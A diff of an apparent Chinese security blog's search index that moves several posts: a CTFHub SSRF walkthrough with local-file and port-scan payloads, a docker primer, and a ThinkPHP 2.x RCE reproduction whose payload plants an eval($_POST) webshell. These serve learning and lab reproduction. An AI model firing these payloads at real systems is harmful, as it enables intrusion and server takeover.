@@ -166,110 +166,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfhub之ssrf</title>
-    <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
-    <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接构造url<code>?url=http://127.0.0.1/flag.php</code></p>
-<p><img src="https://i.loli.net/2021/07/19/ZWTUa7RtHKGEQe4.png" alt="image-20210719213700332"></p>
-<h2 id="伪协议读取文件（file协议）"><a href="#伪协议读取文件（file协议）" class="headerlink" title="伪协议读取文件（file协议）"></a>伪协议读取文件（file协议）</h2><p>尝试去读取一下Web目录下的flag.php吧</p>
-<p>linux网站的默认目录是<code>/var/www/html</code></p>
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>?url=file:///var/www/html/flag.php</code></p>
-<p><img src="https://i.loli.net/2021/07/19/milXBUDKG3nLSIw.png" alt="image-20210719214708812"></p>
-<p>右键查看页面源码</p>
-<p><img src="https://i.loli.net/2021/07/19/SzAmxP7aE5Yd8wV.png" alt="image-20210719214812341"></p>
-<h2 id="端口扫描（http-dict协议）"><a href="#端口扫描（http-dict协议）" class="headerlink" title="端口扫描（http/dict协议）"></a>端口扫描（http/dict协议）</h2><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p>
-<blockquote>
-<p>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p>
-</blockquote>
-<p>这里要对ip进行内网端口探测，使用burp抓包跑一下</p>
-<p>对端口参数添加一下变量</p>
-<p><img src="https://i.loli.net/2021/07/19/SGa76DWRfLE1hkp.png" alt="image-20210719220453504"></p>
-<blockquote>
-<p>这里还可以是dict协议</p>
-</blockquote>
-<p>设置一下参数</p>
-<p><img src="https://i.loli.net/2021/07/19/N1MW9yt2AOE8DFx.png" alt="image-20210719220428828"></p>
-<p>根据长度找到开放的端口为8347，flag存在于响应包中</p>
-<p><img src="https://i.loli.net/2021/07/19/Tbrcm2OsxAEa4n3.png" alt="image-20210719220708156"></p>
-<h2 id="第二部分-gopher协议"><a href="#第二部分-gopher协议" class="headerlink" title="第二部分 gopher协议"></a>第二部分 gopher协议</h2><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>index.php</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dnslog盲打</title>
-    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>docker基本使用</title>
-    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
-<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/Kc418tknQyboP2B.png" alt="image-20210417215354480"></p>
-<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>参数解释：</p>
-<p>-d 镜像在后台运行</p>
-<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
-<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
-</blockquote>
-<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
-<p><img src="https://i.loli.net/2021/07/18/3SrifKmUEc4gDjH.png" alt="image-20210417222849702"></p>
-<blockquote>
-<p>请注意这张图片中的容器端口8801是错误的</p>
-</blockquote>
-<p>但是会报错，是因为没有开启ipv4转发</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
-</blockquote>
-<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
-<p><img src="https://i.loli.net/2021/07/18/SzxIcodBJ8OKXlP.png" alt="image-20210417222634372"></p>
-<p>重启服务并查看修改是否成功</p>
-<p><img src="https://i.loli.net/2021/07/18/eEBdl8F42iau5h7.png" alt="image-20210417222728689"></p>
-<blockquote>
-<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/18/bw2fHrsI69uhdyN.png" alt="image-20210418160119935"></p>
-<blockquote>
-<p>成功访问</p>
-</blockquote>
-<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/iObYJydP1umQ5ea.png" alt="image-20210417223707346"></p>
-<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/fqElpH7iRYBAKDQ.png" alt="image-20210417223949376"></p>
-<p><img src="https://i.loli.net/2021/07/18/aNjniAr1lCGOJe5.png" alt="image-20210418160159989"></p>
-<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
-<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
-<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>删除容器和镜像时需要注意的是：</p>
-<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
-</blockquote>
-<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web入门sql注入</title>
     <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
@@ -380,6 +276,110 @@
       </categories>
       <tags>
         <tag>ctf-sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub之ssrf</title>
+    <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
+    <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接构造url<code>?url=http://127.0.0.1/flag.php</code></p>
+<p><img src="https://i.loli.net/2021/07/19/ZWTUa7RtHKGEQe4.png" alt="image-20210719213700332"></p>
+<h2 id="伪协议读取文件（file协议）"><a href="#伪协议读取文件（file协议）" class="headerlink" title="伪协议读取文件（file协议）"></a>伪协议读取文件（file协议）</h2><p>尝试去读取一下Web目录下的flag.php吧</p>
+<p>linux网站的默认目录是<code>/var/www/html</code></p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>?url=file:///var/www/html/flag.php</code></p>
+<p><img src="https://i.loli.net/2021/07/19/milXBUDKG3nLSIw.png" alt="image-20210719214708812"></p>
+<p>右键查看页面源码</p>
+<p><img src="https://i.loli.net/2021/07/19/SzAmxP7aE5Yd8wV.png" alt="image-20210719214812341"></p>
+<h2 id="端口扫描（http-dict协议）"><a href="#端口扫描（http-dict协议）" class="headerlink" title="端口扫描（http/dict协议）"></a>端口扫描（http/dict协议）</h2><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p>
+<blockquote>
+<p>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p>
+</blockquote>
+<p>这里要对ip进行内网端口探测，使用burp抓包跑一下</p>
+<p>对端口参数添加一下变量</p>
+<p><img src="https://i.loli.net/2021/07/19/SGa76DWRfLE1hkp.png" alt="image-20210719220453504"></p>
+<blockquote>
+<p>这里还可以是dict协议</p>
+</blockquote>
+<p>设置一下参数</p>
+<p><img src="https://i.loli.net/2021/07/19/N1MW9yt2AOE8DFx.png" alt="image-20210719220428828"></p>
+<p>根据长度找到开放的端口为8347，flag存在于响应包中</p>
+<p><img src="https://i.loli.net/2021/07/19/Tbrcm2OsxAEa4n3.png" alt="image-20210719220708156"></p>
+<h2 id="第二部分-gopher协议"><a href="#第二部分-gopher协议" class="headerlink" title="第二部分 gopher协议"></a>第二部分 gopher协议</h2><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dnslog盲打</title>
+    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>docker基本使用</title>
+    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
+<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/Kc418tknQyboP2B.png" alt="image-20210417215354480"></p>
+<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参数解释：</p>
+<p>-d 镜像在后台运行</p>
+<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
+<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
+</blockquote>
+<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
+<p><img src="https://i.loli.net/2021/07/18/3SrifKmUEc4gDjH.png" alt="image-20210417222849702"></p>
+<blockquote>
+<p>请注意这张图片中的容器端口8801是错误的</p>
+</blockquote>
+<p>但是会报错，是因为没有开启ipv4转发</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
+</blockquote>
+<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
+<p><img src="https://i.loli.net/2021/07/18/SzxIcodBJ8OKXlP.png" alt="image-20210417222634372"></p>
+<p>重启服务并查看修改是否成功</p>
+<p><img src="https://i.loli.net/2021/07/18/eEBdl8F42iau5h7.png" alt="image-20210417222728689"></p>
+<blockquote>
+<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/18/bw2fHrsI69uhdyN.png" alt="image-20210418160119935"></p>
+<blockquote>
+<p>成功访问</p>
+</blockquote>
+<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/iObYJydP1umQ5ea.png" alt="image-20210417223707346"></p>
+<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/fqElpH7iRYBAKDQ.png" alt="image-20210417223949376"></p>
+<p><img src="https://i.loli.net/2021/07/18/aNjniAr1lCGOJe5.png" alt="image-20210418160159989"></p>
+<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
+<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
+<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删除容器和镜像时需要注意的是：</p>
+<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
+</blockquote>
+<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -712,6 +712,35 @@
       </tags>
   </entry>
   <entry>
+    <title>thinkphp 2-rce</title>
+    <url>/2021/09/30/thinkphp-2-rce/</url>
+    <content><![CDATA[<h2 id="thinkphp-2-rce"><a href="#thinkphp-2-rce" class="headerlink" title="thinkphp 2-rce"></a>thinkphp 2-rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">res = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;</span>\\1\<span class="string">&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span></span><br></pre></td></tr></table></figure>
+<p>导致输入的参数被插入双引号中执行，造成任意代码执行漏洞</p>
+<p><code>preg_replace(&#39;正则表达&#39;,&#39;替换字符&#39;,&#39;目标字符&#39;)</code></p>
+<p>就是如果目标字符中存在符合正则规则的字符，那么就替换为替换字符，而如果此时正则规则中使用了<code>/e</code>这个修饰符，则存在代码执行漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </span><br><span class="line">&#x2F;e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br></pre></td></tr></table></figure>
+<p>详细分析见<a href="https://www.freebuf.com/column/223149.html">ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行</a></p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>thinkPHP 2.x</p>
+<p>thinkphp lite模式下3.0</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问8080端口</p>
+<p><img src="https://i.loli.net/2021/09/30/yLwKVcpOEkQxjne.png" alt="image-20210930203058925"></p>
+<p>payload</p>
+<p><code>ip:8080/index.php?s=/index/index/xxx/$&#123;@phpinfo()&#125;</code></p>
+<p><img src="https://i.loli.net/2021/10/20/uhLTNQoWy8fqPcI.png" alt="image-20211020195146011"></p>
+<p><code>ip:8080/index.php?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125;</code> //一句话连接蚁剑菜刀</p>
+<p>回显系统发生错误，但其实已经执行成功</p>
+<p><img src="https://i.loli.net/2021/10/20/JT1rYBGeCaLV6ZE.png" alt="image-20211020200702800"></p>
+<p>测试一下连接</p>
+<p><img src="https://i.loli.net/2021/10/20/hx1ZiKqcoOmXECS.png" alt="image-20211020200340886"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.wangan.com/docs/446">ThinkPHP 2.x 任意代码执行漏洞</a></p>
+<p><a href="https://www.cnblogs.com/cute-puli/p/13285528.html">漏洞复现-2.x rce-Thinkphp远程命令执行</a></p>
+<p><a href="https://www.cnblogs.com/ingd/p/7222424.html">ThinkPHP 框架2.1，2.2和3.0版本开启lite模式导致URL命令执行漏洞</a></p>
+]]></content>
+      <tags>
+        <tag>thinkphp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shiro权限绕过CVE-2020-1957</title>
     <url>/2021/09/11/shiro-CVE-2020-1957/</url>
     <content><![CDATA[<h2 id="shiro权限绕过CVE-2020-1957"><a href="#shiro权限绕过CVE-2020-1957" class="headerlink" title="shiro权限绕过CVE-2020-1957"></a>shiro权限绕过CVE-2020-1957</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.5.2版本以下</p>
@@ -744,35 +773,6 @@
       </tags>
   </entry>
   <entry>
-    <title>thinkphp 2-rce</title>
-    <url>/2021/09/30/thinkphp-2-rce/</url>
-    <content><![CDATA[<h2 id="thinkphp-2-rce"><a href="#thinkphp-2-rce" class="headerlink" title="thinkphp 2-rce"></a>thinkphp 2-rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">res = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;</span>\\1\<span class="string">&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span></span><br></pre></td></tr></table></figure>
-<p>导致输入的参数被插入双引号中执行，造成任意代码执行漏洞</p>
-<p><code>preg_replace(&#39;正则表达&#39;,&#39;替换字符&#39;,&#39;目标字符&#39;)</code></p>
-<p>就是如果目标字符中存在符合正则规则的字符，那么就替换为替换字符，而如果此时正则规则中使用了<code>/e</code>这个修饰符，则存在代码执行漏洞</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  </span><br><span class="line">&#x2F;e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br></pre></td></tr></table></figure>
-<p>详细分析见<a href="https://www.freebuf.com/column/223149.html">ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行</a></p>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>thinkPHP 2.x</p>
-<p>thinkphp lite模式下3.0</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>访问8080端口</p>
-<p><img src="https://i.loli.net/2021/09/30/yLwKVcpOEkQxjne.png" alt="image-20210930203058925"></p>
-<p>payload</p>
-<p><code>ip:8080/index.php?s=/index/index/xxx/$&#123;@phpinfo()&#125;</code></p>
-<p><img src="https://i.loli.net/2021/10/20/uhLTNQoWy8fqPcI.png" alt="image-20211020195146011"></p>
-<p><code>ip:8080/index.php?s=a/b/c/$&#123;@print(eval($_POST[1]))&#125;</code> //一句话连接蚁剑菜刀</p>
-<p>回显系统发生错误，但其实已经执行成功</p>
-<p><img src="https://i.loli.net/2021/10/20/JT1rYBGeCaLV6ZE.png" alt="image-20211020200702800"></p>
-<p>测试一下连接</p>
-<p><img src="https://i.loli.net/2021/10/20/hx1ZiKqcoOmXECS.png" alt="image-20211020200340886"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.wangan.com/docs/446">ThinkPHP 2.x 任意代码执行漏洞</a></p>
-<p><a href="https://www.cnblogs.com/cute-puli/p/13285528.html">漏洞复现-2.x rce-Thinkphp远程命令执行</a></p>
-<p><a href="https://www.cnblogs.com/ingd/p/7222424.html">ThinkPHP 框架2.1，2.2和3.0版本开启lite模式导致URL命令执行漏洞</a></p>
-]]></content>
-      <tags>
-        <tag>thinkphp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>thinkphp 5.0.23-rce</title>
     <url>/2021/10/20/thinkphp-5-0-23-rce/</url>
     <content><![CDATA[<h2 id="thinkphp-5-0-23-rce"><a href="#thinkphp-5-0-23-rce" class="headerlink" title="thinkphp 5.0.23-rce"></a>thinkphp 5.0.23-rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>获取method的方法中没有正确处理方法名，导致可以调用request类任意方法并构造利用链，导致rce</p>
@@ -800,8 +800,7 @@
 
 <p><img src="https://i.loli.net/2021/10/25/fT67ZVeSCQn9Jcg.png" alt="image-20211025111506856"></p>
 <p><img src="https://i.loli.net/2021/10/25/36vksn18SoGtRLi.png" alt="image-20211025111703949"></p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">poc</a></p>
-<p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/252811#h2-10">ThinkPHP V5 漏洞复现</a></p>
 <p><a href="https://blog.csdn.net/nicesa/article/details/106247668">ThinkPHP5 5.0.23 远程代码执行漏洞</a></p>
 <p><a href="https://www.sohu.com/a/290190100_100014967">漏洞研究|ThinkPHP request函数远程代码执行</a></p>
 <p><a href="https://www.codercto.com/a/54587.html">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
@@ -901,6 +900,16 @@
       <tags>
         <tag>Tomcat</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</title>
+    <url>/2021/10/25/thinkphp-5-rce/</url>
+    <content><![CDATA[<h2 id="ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce"><a href="#ThinkPHP5-5-0-22-5-1-29-未开启强制路由rce" class="headerlink" title="ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce"></a>ThinkPHP5 5.0.22/5.1.29 未开启强制路由rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致rce</p>
